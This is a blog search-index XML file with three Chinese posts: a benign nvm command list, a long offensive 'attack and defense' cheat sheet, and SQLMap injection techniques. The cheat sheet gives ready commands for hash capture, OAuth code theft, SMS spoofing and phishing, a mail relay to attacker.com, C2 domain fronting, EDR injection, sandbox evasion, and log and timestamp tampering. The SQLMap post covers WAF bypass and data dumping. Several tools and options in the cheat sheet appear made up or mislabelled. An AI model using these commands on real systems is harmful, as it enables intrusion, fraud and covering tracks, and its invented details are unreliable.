<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>前端总结【常用命令】</title>
    <url>/cnblogs.github.io/p/56205.html</url>
    <content><![CDATA[<h4 id="前端命令"><a href="#前端命令" class="headerlink" title="前端命令"></a>前端命令</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">在项目开发过程中，使用到vue框架技术，需要安装node下载项目依赖，但经常会遇到node版本不匹配而导致无法正常下载，重新安装node却又很麻烦。为解决以上问题，nvm：一款node的版本管理工具，能够管理node的安装和使用，使用简单，可下载指定node版本和切换使用不同版本，方便了node的使用。</span><br><span class="line"></span><br><span class="line">nvm ls-remote # 列出所有远程服务器的版本（官方node version list）</span><br><span class="line">nvm list # (可简化为nvm ls) 列出所有已安装的 node 版本</span><br><span class="line">nvm list available # 显示所有可下载的版本</span><br><span class="line">nvm install stable # 安装最新版 node</span><br><span class="line">nvm install [node版本号] # 安装指定版本 node</span><br><span class="line">nvm uninstall [node版本号] # 删除已安装的指定版本</span><br><span class="line">nvm use [node版本号] # 切换到指定版本 node</span><br><span class="line">nvm current ：当前 node 版本 nvm alias [别名] [node版本号] # 给不同的版本号添加别名</span><br><span class="line">nvm unalias [别名] ：删除已定义的别名 nvm alias default [node版本号] # 设置默认版本</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/coreybutler/nvm-windows/releases">NVM下载</a></p>
]]></content>
      <categories>
        <category>前端总结</category>
      </categories>
      <tags>
        <tag>前端总结</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacker总结一【攻防实战技巧】</title>
    <url>/cnblogs.github.io/p/97da.html</url>
    <content><![CDATA[<h2 id="一、信息收集基础篇"><a href="#一、信息收集基础篇" class="headerlink" title="一、信息收集基础篇"></a>一、信息收集基础篇</h2><p>证书透明度日志挖掘<br>curl -s “<a href="https://crt.sh/?q=%25.target.com&output=json">https://crt.sh/?q=%25.target.com&amp;output=json</a>“ | jq ‘.[].name_value’ | sed ‘s&#x2F;&quot;&#x2F;&#x2F;g’ | sed ‘s&#x2F;*.&#x2F;&#x2F;g’ | sort -u<br>原理：通过Certificate Transparency获取历史SSL证书关联域名<br>DNS缓存探测攻击<br>dnsrecon -d target.com -t brt -D subdomains-top1million-5000.txt<br>效果：利用DNS缓存投毒原理发现未公开子域<br>企业邮箱格式反推员工ID<br>wget -qO- “<a href="https://target.com/owa/autodiscover/autodiscover.xml">https://target.com/owa/autodiscover/autodiscover.xml</a>“ | grep ‘LegacyDN’<br>关联技巧：结合LinkedIn姓名生成潜在用户名清单<br>云WAF背后的真实IP探测<br>nmap -Pn -sS -p 80,443 –script http-waf-detect –script-args&#x3D;”http-waf-detect.aggro” target.com<br>关键参数：–script-args设置激进检测模式<br>历史解析记录追溯<br>python3 dnsdumpster.py -d target.com –historical<br>工具特性：整合多家DNS历史数据库</p>
<h2 id="二、子域名深度挖掘"><a href="#二、子域名深度挖掘" class="headerlink" title="二、子域名深度挖掘"></a>二、子域名深度挖掘</h2><p>泛解析突破技术<br>ffuf -w subdomains.txt -u “<a href="http://fuzz.target.com/">http://FUZZ.target.com</a>“ -H “Host: FUZZ.target.com” -mc 200 -t 50<br>原理：利用Host头绑定绕过泛解析限制<br>NSEC记录遍历<br>dig +short NSEC target.com @8.8.8.8 | grep -Eo “[a-zA-Z0-9.-]+.target.com”<br>应用场景：针对启用DNSSEC的域名<br>域名接管漏洞探测<br>subjack -w subdomains.txt -t 100 -ssl -c fingerprints.json -o vulnerable.txt<br>检测要点：过期云服务CNAME记录<br>跨域JS文件关联分析<br>python3 linkfinder.py -i <a href="https://cdn.target.com/main.js">https://cdn.target.com/main.js</a> -o cli<br>输出结果：提取接口路径与新域名<br>被动DNS聚合查询<br>amass enum -passive -d target.com -config config.ini<br>配置文件：集成SecurityTrails&#x2F;WhoisXML等API</p>
<h2 id="三、端口扫描与协议分析"><a href="#三、端口扫描与协议分析" class="headerlink" title="三、端口扫描与协议分析"></a>三、端口扫描与协议分析</h2><p>全端口快速测绘<br>naabu -host target.com -p - -scan-all-ips -rate 1000 -silent<br>优势：绕过传统扫描器端口范围限制<br>高隐蔽性分布式扫描<br>masscan 10.0.0.0&#x2F;8 -p0-65535 –rate 100000 –shard 1&#x2F;10 -oG output.gnmap<br>架构：10台服务器分片扫描全国IP段<br>工控协议指纹识别<br>nmap -sU -p 102 –script s7-info.nse 192.168.1.100<br>重点协议：Siemens S7、Modbus TCP<br>云数据库暴露检测<br>nmap -p 1433,3306,5432 –script ms-sql-info,mysql-info,pgsql-info 10.0.0.0&#x2F;24<br>风险点：公有云默认开放数据库端口<br>私有协议逆向分析<br>tcpflow -r capture.pcap -e port 9999 | strings -10<br>方法：提取未知协议特征关键字</p>
<h2 id="四、云资产深度测绘"><a href="#四、云资产深度测绘" class="headerlink" title="四、云资产深度测绘"></a>四、云资产深度测绘</h2><p>AWS S3存储桶枚举<br>s3scanner scan -bucket-name target -wordlist s3-buckets.txt -region us-west-1<br>关键命令：–check-permissions检测访问权限<br>Azure Blob存储探测<br>az storage blob list –account-name targetstorage –container-name $root –query [].name<br>权限要求：需有效SAS令牌或访问密钥<br>云函数元数据提取<br>curl <a href="http://localhost:9001/2018-06-01/runtime/invocation/next">http://localhost:9001/2018-06-01/runtime/invocation/next</a><br>攻击面：Serverless环境本地调试接口<br>Kubernetes服务发现<br>kubectl get ingress –all-namespaces -o jsonpath&#x3D;’{.items[<em>].spec.rules[</em>].host}’<br>关联资产：Ingress暴露的对外域名<br>CDN边缘节点IP反查<br>python3 censys-search.py “services.http.response.headers.server: Cloudflare” target.com<br>绕过方法：历史解析记录对比</p>
<h2 id="五、内部网络渗透"><a href="#五、内部网络渗透" class="headerlink" title="五、内部网络渗透"></a>五、内部网络渗透</h2><p>LLMNR&#x2F;NBNS欺骗监听<br>responder -I eth0 -dwv –analyze<br>输出：捕获NetNTLMv2哈希用于破解<br>交换机ARP表提取<br>snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.22.1.2<br>OID：1.3.6.1.2.1.4.22.1.2（ipNetToMedia）<br>域控全局编录探测<br>nmap -p 3268 –script ldap-rootdse 192.168.1.100<br>特征：通过GC端口获取域架构信息<br>打印机漏洞扫描<br>python3 PRET.py 192.168.1.200 pdf<br>利用：通过PostScript语言执行命令<br>无线AP隐蔽嗅探<br>airodump-ng wlan0mon –essid ‘Corp-Guest’ -w capture<br>重点：捕获企业访客网络802.1X握手包</p>
<h2 id="六、隐蔽信息泄露挖掘"><a href="#六、隐蔽信息泄露挖掘" class="headerlink" title="六、隐蔽信息泄露挖掘"></a>六、隐蔽信息泄露挖掘</h2><p>GitHub敏感信息扫描<br>trufflehog –regex –entropy&#x3D;False <a href="https://github.com/target/repo.git">https://github.com/target/repo.git</a><br>增强版：自定义关键词规则<br>JS地图文件反编译<br>unwebpack sourcemap.js.map -o src<br>收获：还原前端加密算法与API密钥<br>错误页面路径泄露<br>curl -sk “<a href="https://target.com/">https://target.com/%2e%2e/%2e%2e</a>“ | grep “at line”<br>技巧：通过异常请求触发调试信息<br>备份文件暴力枚举<br>wfuzz -c -w backup_files.txt -u “<a href="http://target.com/FUZZ">http://target.com/FUZZ</a>“ –hc 404<br>字典建议：包含.bak,.swp,.zip等扩展名<br>邮件头MX记录解析<br>dig +short MX target.com | awk ‘{print $2}’ | xargs -I{} dig +short A {}<br>关联资产：发现自建邮件服务器IP</p>
<h2 id="七、物联网与边缘设备"><a href="#七、物联网与边缘设备" class="headerlink" title="七、物联网与边缘设备"></a>七、物联网与边缘设备</h2><p>ONVIF摄像头发现<br>nmap -p 80,443,554 –script onvif-discover 10.0.0.0&#x2F;24<br>特征：识别支持ONVIF协议的监控设备<br>路由器固件反编译<br>binwalk -Me firmware.bin<br>关键步骤：提取文件系统分析硬编码凭证<br>ZigBee设备嗅探<br>ubertooth-scan -f 2405M -c 11<br>频率：2.405GHz-2.480GHz信道遍历<br>MQTT协议订阅<br>mosquitto_sub -h broker.target.com -t “#” -v<br>风险点：未授权访问物联网消息队列<br>BACnet楼宇设备扫描<br>bacnet-discover -i eth0 -d 3<br>输出：暖通空调、门禁系统等设备列表</p>
<h2 id="八、API接口深度挖掘"><a href="#八、API接口深度挖掘" class="headerlink" title="八、API接口深度挖掘"></a>八、API接口深度挖掘</h2><p>Swagger文档泄露利用<br>curl -s <a href="http://api.target.com/v2/api-docs">http://api.target.com/v2/api-docs</a> | jq ‘.paths | keys[]’<br>自动化工具：APIFuzzer<br>GraphQL自省查询</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">query &#123;__schema&#123;types&#123;name fields&#123;name args&#123;name&#125;&#125;&#125;&#125;  </span><br></pre></td></tr></table></figure>
<p>渗透入口：未授权内省功能<br>OAuth令牌劫持<br>mitmproxy -s oauth_poison.py -p 8080<br>脚本功能：修改回调地址窃取code<br>WebSocket敏感操作嗅探<br>wscat -c “ws:&#x2F;&#x2F;target.com&#x2F;ws” –listen 9000<br>捕获：实时通信中的凭证与指令<br>REST参数FUZZ测试<br>ffuf -w params.txt -X POST -u “<a href="http://api.target.com/user?id=FUZZ">http://api.target.com/user?id=FUZZ</a>“ -mr “success”</p>
<h2 id="九、移动应用资产关联"><a href="#九、移动应用资产关联" class="headerlink" title="九、移动应用资产关联"></a>九、移动应用资产关联</h2><p>APK反编译提取域名<br>apktool d app.apk -o decompiled &amp;&amp; grep -rE “https?:&#x2F;&#x2F;[^&#x2F;&quot;‘]+” decompiled&#x2F;<br>增强：使用jadx-gui查看逻辑调用链<br>iOS IPA文件分析<br>otool -L Payload&#x2F;app.app&#x2F;app | grep “.dylib”<br>重点：检查第三方动态库风险<br>应用沙箱数据提取<br>frida -U -f com.target.app -l dump_storage.js<br>脚本功能：导出SQLite&#x2F;SharedPreferences<br>证书绑定绕过检测<br>objection explore -s “android sslpinning disable”<br>原理：Hook SSL验证函数<br>应用备份文件扫描<br>adb backup -f backup.ab com.target.app &amp;&amp; dd if&#x3D;backup.ab bs&#x3D;1 skip&#x3D;24 | openssl zlib -d</p>
<h2 id="十、代码仓库与文档资产"><a href="#十、代码仓库与文档资产" class="headerlink" title="十、代码仓库与文档资产"></a>十、代码仓库与文档资产</h2><p>Git仓库历史追溯<br>git log -p –all | grep -E “password|secret|key”<br>扩展：truffleHog正则表达式深度扫描<br>Confluence空间遍历<br>python3 confluence_export.py -u admin -p pass123 -url <a href="http://wiki.target.com/">http://wiki.target.com</a> -o &#x2F;dump<br>数据泄露：内部技术文档与架构图<br>JIRA问题搜索利用<br>curl -u user:pass “<a href="https://jira.target.com/rest/api/2/search?jql=text~%27credentials">https://jira.target.com/rest/api/2/search?jql=text~&#39;credentials</a>‘“<br>JQL语法：筛选敏感信息条目<br>内部Wiki关键词爬取<br>wget -r -l 5 –accept “*.html” –reject-regex logout <a href="http://wiki.target.com/">http://wiki.target.com</a><br>后处理：cewl生成定制字典<br>Sharepoint文件遍历<br>spiderfoot -u <a href="https://sharepoint.target.com/">https://sharepoint.target.com</a> -m sfp_sharepoint<br>模块功能：自动映射文档库结构</p>
<h2 id="十一、隐蔽通信与日志分析"><a href="#十一、隐蔽通信与日志分析" class="headerlink" title="十一、隐蔽通信与日志分析"></a>十一、隐蔽通信与日志分析</h2><p>DNS隧道流量识别<br>tshark -n -r traffic.pcap -Y “dns.qry.name contains .attacker.com” -T fields -e ip.src<br>检测点：异常长域名查询<br>代理日志关联分析<br>cat squid.log | awk ‘{print $3}’ | sort | uniq -c | sort -nr<br>定位：高频访问内部系统的外网IP<br>Windows事件日志检索<br>Get-WinEvent -FilterHashtable @{LogName&#x3D;’Security’;ID&#x3D;4624} | ?{$_.Message -match ‘TargetUserName’}<br>关键事件：成功登录记录<br>Linux审计日志分析<br>ausearch -k http_backdoor | aureport -f -i<br>监控点：异常文件访问行为<br>数据库慢查询日志挖掘<br>mysqldumpslow -s t &#x2F;var&#x2F;log&#x2F;mysql&#x2F;slow.log | grep -E “(SELECT|UPDATE).*WHERE”<br>价值：发现未索引的敏感字段</p>
<h2 id="十二、第三方服务关联"><a href="#十二、第三方服务关联" class="headerlink" title="十二、第三方服务关联"></a>十二、第三方服务关联</h2><p>供应商接口测试<br>curl -H “X-Forwarded-For: 192.168.1.100” <a href="https://vendor.target.com/api">https://vendor.target.com/api</a><br>绕过：IP白名单校验<br>短信网关漏洞利用<br>python3 sms_spoof.py -to +8613800138000 -from 10086 -msg “系统升级，验证码：123456”<br>风险：伪造官方号码发送钓鱼短信<br>CDN边缘节点接管<br>dig +short target.com.cdn.cloudflare.net | xargs -I{} host {}<br>验证：CNAME记录归属权<br>OSS存储桶权限检测<br>aliyun oss GetBucketAcl oss:&#x2F;&#x2F;target-bucket<br>权限模型：public-read-write风险最高<br>微信小程序反编译<br>unveilr -i com.target.miniapp -o decompiled<br>数据泄露：内网API地址与加密密钥</p>
<h2 id="十三、社会工程学实战"><a href="#十三、社会工程学实战" class="headerlink" title="十三、社会工程学实战"></a>十三、社会工程学实战</h2><p>钓鱼邮件元数据伪造<br>python3 phishingkit.py –from “HR <a href="mailto:&#x68;&#x72;&#64;&#116;&#97;&#x72;&#x67;&#101;&#116;&#x2e;&#x63;&#x6f;&#x6d;">&#x68;&#x72;&#64;&#116;&#97;&#x72;&#x67;&#101;&#116;&#x2e;&#x63;&#x6f;&#x6d;</a>“ –reply-to “<a href="mailto:&#104;&#114;&#64;&#114;&#x65;&#97;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#104;&#114;&#64;&#114;&#x65;&#97;&#x6c;&#x2e;&#99;&#111;&#x6d;</a>“ –server smtp.gmail.com –ssl<br>关键头：设置正确的DKIM&#x2F;SPF记录规避检测<br>员工通讯录智能生成<br>theHarvester -d target.com -b google -l 500 | grep “@target.com” | awk ‘{print $2}’ &gt; emails.lst<br>增强：LinkedIn员工姓名拼接企业邮箱格式<br>二维码钓鱼基站搭建<br>qrljacker –interface wlan0 –essid “内部WiFi认证” –captive-portal<br>触发机制：连接后强制跳转钓鱼页面<br>语音钓鱼（Vishing）模拟<br>asterisk -rx “channel originate SIP&#x2F;attacker extension 1000@victim-context”<br>伪装：来电显示修改为内部短号<br>工牌克隆攻击<br>proxmark3 -c “hf 14a read; hf 14a sim -t 7b”<br>目标：复制高频RFID门禁卡</p>
<h2 id="十四、物理设备渗透"><a href="#十四、物理设备渗透" class="headerlink" title="十四、物理设备渗透"></a>十四、物理设备渗透</h2><p>网口镜像流量捕获<br>tcpdump -i eth0 -w capture.pcap host 192.168.1.100 and port 80<br>前提：接入交换机配置端口镜像<br>HID攻击键盘注入<br>bash bunny-payload.sh -l posix -c “DELAY 1000 GUI r DELAY 100 STRING cmd ENTER”<br>设备：使用Bash Bunny执行物理击键<br>隐蔽式PoE供电窃听<br>thc-ipv6-address6 -i eth0 -a clone<br>配合：利用PoE供电的树莓派植入<br>打印机NVRAM数据提取<br>pjl-encoding –host 192.168.1.200 –get-nvram | grep “job.log”<br>敏感信息：打印任务历史记录<br>智能门锁蓝牙爆破<br>btlejack -c 37 -t 5C:FB:7A:11:22:33 -o capture.pcap<br>漏洞：低功耗蓝牙加密强度不足</p>
<h2 id="十五、代码与配置审计"><a href="#十五、代码与配置审计" class="headerlink" title="十五、代码与配置审计"></a>十五、代码与配置审计</h2><p>硬编码密钥模式匹配<br>grep -rE “(?i)(password|secret|key|token)\s*[:&#x3D;]\s*[‘&quot;][a-z0-9]{20,}[‘&quot;]” &#x2F;src<br>正则优化：排除测试环境配置<br>CI&#x2F;CD流水线漏洞<br>jenkins-jobs –user admin –password-file pass.txt list-all-jobs<br>敏感操作：获取构建脚本中的凭证<br>Dockerfile风险检测<br>grep -rE “(ADD|COPY)\s.*.(pem|key|db)” .&#x2F;dockerfiles<br>重点：检查敏感文件打包进镜像<br>SSH配置弱点扫描<br>nmap -p22 –script ssh2-enum-algos,ssh-auth-methods 192.168.1.0&#x2F;24<br>风险项：支持弱加密算法<br>防火墙规则逆向推导<br>iptables-save &gt; rules.v4 &amp;&amp; cat rules.v4 | grep ACCEPT<br>分析：暴露的非常用端口</p>
<h2 id="十六、红队基础设施"><a href="#十六、红队基础设施" class="headerlink" title="十六、红队基础设施"></a>十六、红队基础设施</h2><p>域前置CDN配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;  </span><br><span class="line">    listen 443 ssl;  </span><br><span class="line">    server_name cdn.target.com;  </span><br><span class="line">    ssl_certificate /path/real.crt;  </span><br><span class="line">    location / &#123;  </span><br><span class="line">        proxy_pass http://c2_server;  </span><br><span class="line">        proxy_ssl_server_name on;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>检测难点：证书与域名完全匹配<br>动态DNS快速切换<br>curl “<a href="https://api.dynu.com/nic/update?hostname=malicious.ddns.net&myip=$">https://api.dynu.com/nic/update?hostname=malicious.ddns.net&amp;myip=$</a>(curl -s ifconfig.me)”<br>优势：IP快速更换躲避封禁<br>邮件服务器隐蔽中继<br>postconf -e “relayhost &#x3D; [attacker.com]:587” &amp;&amp; systemctl reload postfix<br>特征：使用STARTTLS加密中继</p>
<h2 id="十七、日志与痕迹对抗"><a href="#十七、日志与痕迹对抗" class="headerlink" title="十七、日志与痕迹对抗"></a>十七、日志与痕迹对抗</h2><p>日志实时清洗工具<br>logcleaner -f &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log -r “192.168.1.1[0-9]{2}” -o clean.log<br>功能：正则匹配删除攻击IP记录<br>文件防恢复擦除<br>shred -zun 10 -v confidential.doc<br>参数说明：-z最后用0覆盖，-u执行后删除<br>时间线伪造工具<br>touch -r &#x2F;etc&#x2F;passwd malicious.sh<br>参照：复制合法文件时间属性<br>内存执行规避记录<br>memshell -p tomcat -action inject -cmd “whoami” -no-disk<br>原理：驻留于Java进程内存</p>
<h2 id="十八、零日漏洞追踪"><a href="#十八、零日漏洞追踪" class="headerlink" title="十八、零日漏洞追踪"></a>十八、零日漏洞追踪</h2><p>GitHub监控自动化<br>ghmonitor -u target_org -k “password,encrypt,config” -t ghp_xxx<br>实时推送：关键词关联仓库动态<br>补丁对比漏洞挖掘<br>diff -r source_patched&#x2F; source_original&#x2F; | grep “CVE-2023”<br>重点：分析安全更新代码差异<br>调试接口未授权访问<br>curl -v <a href="http://target.com/actuator/health">http://target.com/actuator/health</a> | jq .status<br>Spring Boot常见端点：&#x2F;env, &#x2F;heapdump<br>驱动漏洞扫描<br>windbg -c “!chkimg nt!NtCreateFile”<br>检测：内核函数钩子异常</p>
<h2 id="十九、高级网络测绘"><a href="#十九、高级网络测绘" class="headerlink" title="十九、高级网络测绘"></a>十九、高级网络测绘</h2><p>全网IPv6资产探测<br>zmap -6 -p 80 –ipv6-target-file&#x3D;targets.txt -o ipv6_http.csv<br>前提：需具备IPv6广播地址<br>BGP路由劫持检测<br>bgpstream-parser -c routeviews -t 20230815 | grep “target_asn”<br>数据源：RouteViews、RIPE RIS<br>暗网资产关联<br>onionScan –url&#x3D;<a href="http://targetmarket.onion/">http://targetmarket.onion</a> –fullscan<br>关联点：公司邮箱注册的暗网账号<br>卫星通信频段扫描<br>gnuradio-companion satellite_scanner.grc<br>硬件要求：USRP设备+抛物面天线</p>
<h2 id="二十、防御体系对抗"><a href="#二十、防御体系对抗" class="headerlink" title="二十、防御体系对抗"></a>二十、防御体系对抗</h2><p>EDR进程注入绕过<br>injector.exe -p 456 -s shellcode.bin -t IndirectSyscall<br>技术：直接系统调用+堆加密<br>沙箱环境指纹识别</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if ((Get-WmiObject Win32_ComputerSystem).Manufacturer -eq &quot;VMware, Inc.&quot;) &#123; exit &#125;  </span><br><span class="line">if (Get-Process -Name &quot;vmtoolsd&quot; -ErrorAction SilentlyContinue) &#123; exit &#125;  </span><br></pre></td></tr></table></figure>
<p>硬件虚拟化检测<br>lscpu | grep Hypervisor<br>退出策略：存在虚拟化特征时停止攻击<br>流量伪装混淆<br>stegotorus chop -d 80 -f http -p password -r 192.168.1.1:8080<br>原理：将C2流量嵌入HTTP头部</p>
<h2 id="二十一、法律与合规边界"><a href="#二十一、法律与合规边界" class="headerlink" title="二十一、法律与合规边界"></a>二十一、法律与合规边界</h2><p>授权测试范围确认<br>nmap -sL 192.168.1.0&#x2F;24 | grep -v “不在范围” &gt; scope.txt<br>红线：严禁扫描授权外IP段<br>数据脱敏处理<br>anonip -i pcap.pcap -o anon.pcap -m “192.168.1.0&#x2F;24-&gt;10.0.0.0&#x2F;24”<br>要求：报告中的IP全部替换为伪地址<br>渗透测试保险策略<br>保险范围必须包含：第三方数据泄露责任、应急响应费用</p>
<h2 id="二十二、自动化武器库"><a href="#二十二、自动化武器库" class="headerlink" title="二十二、自动化武器库"></a>二十二、自动化武器库</h2><p>综合扫描平台搭建</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FROM kalilinux/kali-rolling  </span><br><span class="line">RUN apt install -y nuclei xray gowitness amass  </span><br><span class="line">CMD [&quot;自动化扫描脚本.sh&quot;] </span><br></pre></td></tr></table></figure>
<p>漏洞POC分级管理<br>poc-triage –dir .&#x2F;pocs –severity critical,high –tag target_industry<br>攻击链可视化<br>python3 attack_graph.py -i logs.json -o timeline.html</p>
]]></content>
      <categories>
        <category>Hacker</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacker总结三【SQLMap渗透技巧】</title>
    <url>/cnblogs.github.io/p/927.html</url>
    <content><![CDATA[<h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><h3 id="时间盲注精准控制"><a href="#时间盲注精准控制" class="headerlink" title="时间盲注精准控制"></a>时间盲注精准控制</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--time-sec：延长延时盲注的等待时间（规避阈值检测）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--technique=T：指定时间盲注技术</span></span><br><span class="line"> sqlmap -u &quot;http://site.com?id=1&quot; --time-sec=15 --technique=T</span><br></pre></td></tr></table></figure>

<h3 id="二阶SQL注入检测"><a href="#二阶SQL注入检测" class="headerlink" title="二阶SQL注入检测"></a>二阶SQL注入检测</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--second-url：在提交后跳转的页面检测结果</span></span><br><span class="line">sqlmap -u &quot;http://site.com/register&quot; --forms --second-url=&quot;http://site.com/profile&quot;</span><br></pre></td></tr></table></figure>

<h3 id="WAF指纹识别与绕过"><a href="#WAF指纹识别与绕过" class="headerlink" title="WAF指纹识别与绕过"></a>WAF指纹识别与绕过</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--identify-waf：识别目标WAF类型（Cloudflare/Akamai等）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--tamper：调用多脚本组合绕过（内置60+绕过脚本）</span></span><br><span class="line">sqlmap -u &quot;http://site.com?id=1&quot; --identify-waf --tamper=&quot;apostrophemask,chardoubleencode&quot;</span><br></pre></td></tr></table></figure>

<h3 id="绕过WAF的载荷篡改技巧"><a href="#绕过WAF的载荷篡改技巧" class="headerlink" title="绕过WAF的载荷篡改技巧"></a>绕过WAF的载荷篡改技巧</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">动态分块传输绕过WAF</span></span><br><span class="line">sqlmap -u &quot;http://site.com?id=1&quot; --chunked</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用多重编码绕过过滤</span></span><br><span class="line">sqlmap -u &quot;http://target.com/vuln.php?id=1&quot; --tamper=charencode,charunicodeencode</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">随机注释混淆检测规则</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --tamper=randomcomments</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用超长UTF-8编码绕过检测</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --tamper=overlongutf8</span><br></pre></td></tr></table></figure>

<h3 id="正则过滤目标字段"><a href="#正则过滤目标字段" class="headerlink" title="正则过滤目标字段"></a>正则过滤目标字段</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">仅提取符合正则规则的敏感数据（如特定邮箱域名）</span></span><br><span class="line">sqlmap -u &quot;http://site.com?id=1&quot; -D dbname -T users -C email --regex=&quot;.*@gmail\.com&quot;</span><br></pre></td></tr></table></figure>

<h3 id="精准定位二阶注入点"><a href="#精准定位二阶注入点" class="headerlink" title="精准定位二阶注入点"></a>精准定位二阶注入点</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先记录包含注入点的请求</span></span><br><span class="line">sqlmap -r request.txt --dbms=MySQL --second-order &quot;http://target.com/process.php&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定参数和数据库进行深度挖掘</span></span><br><span class="line">sqlmap -r request.txt -p username --second-order &quot;http://target.com/dashboard.php&quot; -D users --dump</span><br></pre></td></tr></table></figure>

<h3 id="基于Cookie-Session的注入"><a href="#基于Cookie-Session的注入" class="headerlink" title="基于Cookie&#x2F;Session的注入"></a>基于Cookie&#x2F;Session的注入</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">携带Cookie进行注入测试</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --cookie=&quot;PHPSESSID=12345; auth=admin&quot; --batch</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">针对Session参数注入</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --session=&quot;sid=*&quot; --level=5</span><br></pre></td></tr></table></figure>

<h3 id="利用HTTP头注入点"><a href="#利用HTTP头注入点" class="headerlink" title="利用HTTP头注入点"></a>利用HTTP头注入点</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试User-Agent注入</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --user-agent=&quot;*&quot; --batch</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试X-Forwarded-For注入</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --headers=&quot;X-Forwarded-For: *&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">HTTP参数污染（HPP）利用</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">强制识别多个同名参数（绕过异常处理逻辑）</span></span><br><span class="line">sqlmap -u &quot;http://site.com?id=1&amp;id=2&quot; --param-del=&quot;&amp;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="定制化注入载荷"><a href="#定制化注入载荷" class="headerlink" title="定制化注入载荷"></a>定制化注入载荷</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定SQL查询执行</span></span><br><span class="line">sqlmap -u &quot;http://target.com/vuln.php?id=1&quot; --sql-query=&quot;SELECT @@version&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加载自定义载荷文件</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --payload-file=custom_payloads.txt</span><br></pre></td></tr></table></figure>

<h3 id="无回显注入（盲注）优化"><a href="#无回显注入（盲注）优化" class="headerlink" title="无回显注入（盲注）优化"></a>无回显注入（盲注）优化</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">高速布尔盲注</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --technique=B --threads=10 --batch</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">基于时间的盲注（针对无响应页面）</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --technique=T --time-sec=5</span><br></pre></td></tr></table></figure>

<h3 id="多线程与并发优化"><a href="#多线程与并发优化" class="headerlink" title="多线程与并发优化"></a>多线程与并发优化</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">提高并发请求数（需注意目标负载）</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --threads=20 --batch</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制请求延迟（避免触发防护）</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --delay=0.5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--threads：并发线程数（避免压垮目标服务器）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--optimize：自动选择最佳检测参数</span></span><br><span class="line">sqlmap -u &quot;http://site.com?id=1&quot; --threads=5 --optimize</span><br></pre></td></tr></table></figure>

